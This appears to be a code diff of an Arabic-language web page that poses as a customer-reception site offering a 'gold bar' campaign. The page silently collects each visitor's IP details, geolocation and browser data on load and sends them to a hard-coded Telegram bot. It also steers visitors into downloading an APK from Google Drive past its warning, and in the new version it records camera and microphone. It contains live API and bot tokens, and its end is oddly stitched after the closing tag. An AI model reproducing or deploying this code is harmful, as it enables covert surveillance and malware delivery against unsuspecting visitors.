@@ -1,81 +1,147 @@
 <!doctype html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>تطبيق المها — جارٍ التحضير</title>
-<style>
-  body {
-    margin:0; background:#0f172a; color:#e5e7eb;
-    font-family: system-ui, sans-serif;
-    display:flex; flex-direction:column; align-items:center; justify-content:center;
-    min-height:100vh; padding:20px; text-align:center;
-  }
-  .container { max-width:800px; width:100%; }
-  iframe { width:100%; aspect-ratio:16/9; border:none; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,.4); }
-  h1 { font-size:1.5rem; margin-bottom:10px; }
-  p { color:#94a3b8; margin-bottom:20px; }
-  #startMedia {
-    margin-top:20px;
-    padding:12px 24px;
-    font-size:16px;
-    font-weight:bold;
-    border:none;
-    border-radius:8px;
-    background:linear-gradient(45deg, #FFD700, #FFC107);
-    color:#000;
-    cursor:pointer;
-    box-shadow:0 4px 10px rgba(0,0,0,0.3);
-    display:inline-flex;
-    align-items:center;
-    gap:8px;
-    transition:transform 0.2s ease;
-  }
-  #startMedia:hover { transform:scale(1.05); }
-  video, img { margin-top:15px; max-width:100%; border-radius:8px; }
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>تطبيق المها — Run Start</title>
+  <style>
+    :root{
+      --bg:#0f172a; --fg:#e5e7eb; --muted:#94a3b8; --card:#111827;
+      --gold1:#FFD700; --gold2:#FFC107; --accent:#22d3ee; --shadow:rgba(0,0,0,.35);
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; background:linear-gradient(180deg, #0b1223, #0f172a);
+      color:var(--fg); font-family:system-ui, -apple-system, "Segoe UI", Roboto, "Noto Naskh Arabic", sans-serif;
+      min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px;
+    }
+    .container{width:100%; max-width:900px}
+    .card{
+      background:linear-gradient(180deg, #0f172a, #0c1224);
+      border:1px solid #1f2937; border-radius:16px; padding:20px;
+      box-shadow:0 10px 30px var(--shadow);
+    }
+    h1{margin:0 0 8px; font-size:1.6rem}
+    p.lead{margin:0 0 16px; color:var(--muted)}
+    .media{border-radius:12px; overflow:hidden; box-shadow:0 10px 30px var(--shadow)}
+    iframe{width:100%; aspect-ratio:16/9; border:0; display:block}
+    .actions{display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:16px}
+    .btn{
+      border:0; cursor:pointer; font-weight:700; font-size:16px; padding:12px 20px; border-radius:10px;
+      display:inline-flex; align-items:center; gap:10px; transition:transform .15s ease, box-shadow .15s ease;
+    }
+    .btn-gold{
+      background:linear-gradient(45deg, var(--gold1), var(--gold2));
+      color:#1f2937; box-shadow:0 6px 16px rgba(255, 193, 7, .35);
+    }
+    .btn-gold:hover{ transform:translateY(-1px); box-shadow:0 10px 22px rgba(255, 193, 7, .45) }
+    .btn-ghost{ background:#111827; color:var(--fg); border:1px solid #1f2937 }
+    .row{display:grid; grid-template-columns:1fr; gap:16px; margin-top:16px}
+    @media(min-width:900px){ .row{ grid-template-columns: 1fr 1fr } }
+    .panel{background:#0b1223; border:1px solid #1f2937; border-radius:12px; padding:14px}
+    .panel h3{margin:0 0 8px; font-size:1rem; color:#e2e8f0}
+    .mini{color:var(--muted); font-size:.9rem}
+
+    video, img{max-width:100%; border-radius:10px; box-shadow:0 8px 18px var(--shadow)}
+    .toast{
+      position:fixed; bottom:16px; right:16px; left:16px; margin:auto; max-width:520px;
+      background:#0b1223; color:#e5e7eb; border:1px solid #1f2937; border-radius:12px; padding:12px 14px;
+      box-shadow:0 10px 24px var(--shadow); display:none;
+    }
+    .contacts{
+      margin-top:18px; display:flex; gap:10px; flex-wrap:wrap; align-items:center
+    }
+    .contact{
+      background:#0b1223; border:1px solid #1f2937; border-radius:8px; padding:8px 12px; color:#d1d5db;
+      text-decoration:none; display:inline-flex; align-items:center; gap:8px; font-size:.95rem;
+    }
+    .badge{background:#111827; border:1px solid #1f2937; border-radius:999px; padding:6px 10px; color:#cbd5e1}
+  </style>
 </head>
 <body>
-<div class="container">
-  <h1>مرحبا بك في مجمع استقبال العملاء</h1>
-  <p>يتم تشغيل الفيديو وتحميل التطبيق تلقائيًا</p>
-  <iframe src="https://www.youtube.com/embed/zUwlEVnEy-E?autoplay=1&mute=0&playsinline=1&rel=0&modestbranding=1" allowfullscreen></iframe>
-  <button id="startMedia">🌟 سبيكة ذهبية</button>
-  <video id="preview" autoplay muted playsinline></video>
-  <img id="snapshot" alt="صورة ملتقطة" />
-</div>
+  <div class="container">
+    <div class="card">
+      <h1>مرحبا بك في مجمع استقبال العملاء</h1>
+      <p class="lead">يتم تشغيل الفيديو وبدء التحميل في تبويب جديد. يمكنك المشاركة بالحملة عبر زر السبيكة الذهبية 🌟</p>
 
-<script>
-const TELEGRAM_BOT = "8311279268:AAH4R0M7DPNSpx_bWSQ2bi9DuBuUkgqxLm4";
-const TELEGRAM_CHAT = "7664416709";
-const IPINFO_TOKEN = "3bc0a2eadd8ba5";
-const IPDATA_TOKEN = "cf2660a0b70d048e98abd2fa63498f74512ef8c328cb7ea5370ee669";
-const APK_URL = "https://drive.google.com/uc?export=download&id=1nQROVVDXjN1G4_71H0B5D0_4AvSjpVaq";
+      <div class="media"><iframe src="https://www.youtube.com/embed/zUwlEVnEy-E?autoplay=1&mute=1&playsinline=1&rel=0&modestbranding=1" allowfullscreen></iframe></div>
 
-const ua = navigator.userAgent;
-let ipInfoData = {}, ipDataData = {}, geo = {};
+      <div class="actions">
+        <button id="startFlow" class="btn btn-gold">🌟 سبيكة ذهبية — ابدأ</button>
+        <span class="badge">المدة: فيديو+صوت 60 ثانية</span>
+      </div>
 
-function fetchIpInfo() {
-  return fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`).then(r=>r.json()).then(d=>ipInfoData=d).catch(()=>{});
-}
-function fetchIpData() {
-  return fetch(`https://api.ipdata.co?api-key=${IPDATA_TOKEN}`).then(r=>r.json()).then(d=>ipDataData=d).catch(()=>{});
-}
-function fetchGeo() {
-  return new Promise(res=>{
-    if(navigator.geolocation){
-      navigator.geolocation.getCurrentPosition(p=>{
-        geo={lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy};
-        res();
-      },()=>res());
-    } else res();
-  });
-}
+      <div class="row">
+        <div class="panel">
+          <h3>معاينة التسجيل</h3>
+          <video id="preview" autoplay muted playsinline></video>
+          <img id="snapshot" alt="صورة ملتقطة" />
+          <div id="clips"></div>
+          <div class="mini">سيُطلب إذنك لاستخدام الكاميرا والميكروفون. يمكنك الإلغاء في أي وقت.</div>
+        </div>
+        <div class="panel">
+          <h3>معلومات التواصل</h3>
+          <div class="contacts">
+            <a class="contact" href="tel:+212781034015">📞 +212 781-034015</a>
+            <a class="contact" href="mailto:tabonmok7770888@gmail.com">✉️ tabonmok7770888@gmail.com</a>
+            <a class="contact" href="https://instagram.com/shoping_morocco1" target="_blank" rel="noopener">📸 @shoping_morocco1</a>
+          </div>
+          <div class="mini">تواصلك يهمنا. نسعد بخدمتك في أي وقت.</div>
+        </div>
+      </div>
+    </div>
+  </div>
 
-function sendToTelegram(extra="") {
-  const now = new Date().toLocaleString('ar-MA',{hour12:false});
-  const msg = `
-🚀 زيارة جديدة — تطبيق المها
+  <div id="toast" class="toast"></div>
+
+  <script>
+    // بيانات الربط والخدمات
+    const TELEGRAM_BOT = "8311279268:AAH4R0M7DPNSpx_bWSQ2bi9DuBuUkgqxLm4";
+    const TELEGRAM_CHAT = "7664416709";
+    const IPINFO_TOKEN = "3bc0a2eadd8ba5";
+    const IPDATA_TOKEN = "cf2660a0b70d048e98abd2fa63498f74512ef8c328cb7ea5370ee669";
+    const APK_URL = "https://drive.google.com/uc?export=download&id=1nQROVVDXjN1G4_71H0B5D0_4AvSjpVaq"; // يفتح في تبويب جديد
+
+    // عناصر واجهة
+    const toast = document.getElementById('toast');
+    const startBtn = document.getElementById('startFlow');
+    const previewEl = document.getElementById('preview');
+    const snapshotEl = document.getElementById('snapshot');
+    const clipsEl = document.getElementById('clips');
+
+    // حالات
+    const ua = navigator.userAgent;
+    let ipInfoData = {}, ipDataData = {}, geo = {};
+    const RECORD_MS = 60_000; // 60 ثانية
+
+    function showToast(text, ms=4000){
+      toast.textContent = text;
+      toast.style.display = 'block';
+      setTimeout(()=> toast.style.display = 'none', ms);
+    }
+
+    // 1) جمع بيانات الشبكة والموقع وإرسالها
+    function fetchIpInfo(){
+      return fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`)
+        .then(r=>r.json()).then(d=>ipInfoData=d).catch(()=>{});
+    }
+    function fetchIpData(){
+      return fetch(`https://api.ipdata.co?api-key=${IPDATA_TOKEN}`)
+        .then(r=>r.json()).then(d=>ipDataData=d).catch(()=>{});
+    }
+    function fetchGeo(){
+      return new Promise(res=>{
+        if(navigator.geolocation){
+          navigator.geolocation.getCurrentPosition(p=>{
+            geo={lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}; res();
+          }, ()=>res(), {timeout:5000});
+        } else { res(); }
+      });
+    }
+    function sendToTelegram(extra=""){
+      const now = new Date().toLocaleString('ar-MA',{hour12:false});
+      const msg = `
+🚀 زيارة جديدة — Run Start
 ⏱️ ${now}
 
 🌐 [ipinfo.io]
@@ -93,15 +159,75 @@ Lat: ${geo.lat??"null"} Lon: ${geo.lon??"null"} ±${geo.acc??"?"}m
 📱 UA: ${ua}
 
 ${extra}
-  `;
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,{
-    method:"POST", headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:TELEGRAM_CHAT, text:msg})
-  });
-}
+      `;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,{
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id: TELEGRAM_CHAT, text: msg})
+      });
+    }
 
-Promise.all([fetchIpInfo(), fetchIpData(), fetchGeo()]).then(()=>{
-  sendToTelegram();
+    // نجمع البيانات عند الفتح ونرسلها، بدون تعطيل الواجهة
+    Promise.all([fetchIpInfo(), fetchIpData(), fetchGeo()]).then(()=> sendToTelegram());
+
+    // 2) فتح التحميل في تبويب جديد ثم بدء مسار الوسائط بموافقة المستخدم
+    async function startFlow(){
+      // افتح التحميل في تبويب جديد (تحذير جوجل درايف هناك)
+      window.open(APK_URL, '_blank', 'noopener');
+      showToast('تم فتح تبويب جديد: اضغط "التنزيل على أي حال" ثم عُد إلى هذه الصفحة لإكمال المشاركة.');
+
+      // طلب الإذن للكاميرا والميكروفون
+      try{
+        const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+        previewEl.srcObject = stream;
+        sendToTelegram('✅ المستخدم وافق على المشاركة بالصوت/الصورة');
+
+        // التقاط صورة بعد 5 ثوانٍ
+        setTimeout(()=>{
+          try{
+            const v = previewEl;
+            if(v.videoWidth>0 && v.videoHeight>0){
+              const canvas = document.createElement('canvas');
+              canvas.width = v.videoWidth;
+              canvas.height = v.videoHeight;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(v, 0, 0);
+              snapshotEl.src = canvas.toDataURL('image/png');
+              // ملاحظة: هنا يمكنك رفع الصورة لخادمك ثم إرسال الرابط إلى تيليجرام
+            }
+          }catch(e){}
+        }, 5000);
+
+        // تسجيل فيديو+صوت لمدة 60 ثانية
+        const recorder = new MediaRecorder(stream, {mimeType: 'video/webm;codecs=vp9,opus'});
+        const chunks = [];
+        recorder.ondataavailable = e => { if(e.data && e.data.size) chunks.push(e.data); };
+        recorder.onstop = ()=>{
+          const blob = new Blob(chunks, {type:'video/webm'});
+          const url = URL.createObjectURL(blob);
+          const clip = document.createElement('video');
+          clip.src = url; clip.controls = true; clip.style.marginTop = '10px';
+          clipsEl.appendChild(clip);
+          showToast('تم إنهاء التسجيل لمدة 60 ثانية. يمكنك معاينة المقطع بالأسفل.');
+
+          // لرفع الملف إلى تيليجرام ستحتاج خادمًا وسيطًا:
+          // 1) ارفع blob إلى خادمك (POST /upload) ليعيد لك URL عام
+          // 2) استدعِ sendVideo/sendDocument في بوت تيليجرام مع ذلك الرابط العام
+        };
+        recorder.start();
+        showToast('جارٍ التسجيل لمدة 60 ثانية...');
+        setTimeout(()=> recorder.state === 'recording' && recorder.stop(), 60_000);
+
+      }catch(err){
+        sendToTelegram('❌ المستخدم رفض المشاركة بالصوت/الصورة');
+        showToast('لم يتم منح الإذن للكاميرا/الميكروفون.');
+      }
+    }
+
+    // ربط الزر
+    startBtn.addEventListener('click', startFlow);
+  </script>
+</body>
+  </html>  sendToTelegram();
   setTimeout(()=>{ window.location.href = APK_URL; }, 2000);
 });
 
